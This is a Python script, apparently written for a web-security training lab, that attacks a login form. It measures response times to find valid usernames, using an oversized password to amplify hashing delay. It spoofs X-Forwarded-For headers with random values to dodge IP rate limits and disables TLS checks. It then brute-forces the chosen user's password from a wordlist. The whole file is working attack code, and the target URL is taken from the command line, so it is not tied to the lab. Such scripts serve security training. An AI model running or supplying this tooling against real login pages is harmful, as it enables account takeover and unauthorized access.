import time
import uuid
import requests
import sys
import csv
import statistics
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "https://YOUR-LAB-ID.web-security-academy.net/login"
USERNAMES_FILE = sys.argv[2] if len(sys.argv) > 2 else "usernames.txt"
PASSWORDS_FILE = sys.argv[3] if len(sys.argv) > 3 else "passwords.txt"

LONG_PASSWORD = "A" * 150       # amplifies bcrypt/hash cost when username IS valid
SAMPLES_PER_USER = 3            # take multiple timings, use the median (kills noise)

LOG_CSV = "timing_analysis.csv"

session = requests.Session()


def get_unique_headers():
    return {
        "X-Forwarded-For": str(uuid.uuid4()),
        "Content-Type": "application/x-www-form-urlencoded",
    }


def timed_login(username, password):
    """Send one login attempt, return elapsed seconds and status code."""
    headers = get_unique_headers()
    payload = {"username": username, "password": password}
    start = time.perf_counter()
    response = session.post(
        TARGET_URL, data=payload, headers=headers, verify=False, allow_redirects=False
    )
    elapsed = time.perf_counter() - start
    return elapsed, response


def enumerate_username():
    print("[*] Starting username enumeration via timing analysis...\n")

    with open(USERNAMES_FILE) as f:
        usernames = [line.strip() for line in f if line.strip()]

    results = []  # (username, median_time, all_times, status_code)

    with open(LOG_CSV, "w", newline="") as csv_file:
        writer = csv.writer(csv_file)
        writer.writerow(["Username", "Sample_Times", "Median_Time", "Status_Code"])

        for username in usernames:
            samples = []
            status_code = None

            for _ in range(SAMPLES_PER_USER):
                elapsed, response = timed_login(username, LONG_PASSWORD)
                samples.append(elapsed)
                status_code = response.status_code

            median_time = statistics.median(samples)
            results.append((username, median_time, samples, status_code))

            sample_str = ", ".join(f"{t:.4f}" for t in samples)
            print(f"[-] {username:<20} median={median_time:.4f}s  samples=[{sample_str}]  status={status_code}")

            writer.writerow([username, sample_str, f"{median_time:.4f}", status_code])
            csv_file.flush()

    # --- Analysis: find the statistical outlier instead of guessing a fixed threshold ---
    times = [r[1] for r in results]
    baseline = statistics.median(times)
    stdev = statistics.pstdev(times) if len(times) > 1 else 0

    print(f"\n[*] Baseline (median of all): {baseline:.4f}s   stdev: {stdev:.4f}s")

    # Sort slowest first — the real username should stand out clearly
    ranked = sorted(results, key=lambda r: r[1], reverse=True)
    print("\n[*] Ranked by response time (slowest first):")
    for username, median_time, _, _ in ranked:
        delta = median_time - baseline
        flag = "  <-- outlier" if delta > (2 * stdev if stdev > 0 else 0.05) else ""
        print(f"    {username:<20} {median_time:.4f}s  (+{delta:.4f}s vs baseline){flag}")

    slowest_user, slowest_time, _, _ = ranked[0]
    print(f"\n[+] Most likely valid username: {slowest_user} ({slowest_time:.4f}s, baseline {baseline:.4f}s)")
    return slowest_user


def brute_force_password(valid_username):
    print(f"\n[*] Starting password brute-force for user: {valid_username}")
    with open(PASSWORDS_FILE) as f:
        passwords = [line.strip() for line in f if line.strip()]

    for password in passwords:
        headers = get_unique_headers()
        payload = {"username": valid_username, "password": password}
        response = session.post(
            TARGET_URL, data=payload, headers=headers, allow_redirects=False, verify=False
        )

        print(f"[-] Trying password: {password:<20} status={response.status_code}")

        if response.status_code == 302 or "session" in response.cookies:
            print(f"\n[+] SUCCESSFUL LOGIN! Password found: {password}")
            return password

    print("[-] Password not found in list.")
    return None


if __name__ == "__main__":
    valid_user = enumerate_username()
    if valid_user:
        input(f"\n[?] Proceed to brute-force password for '{valid_user}'? Press Enter to continue, Ctrl+C to abort...")
        brute_force_password(valid_user)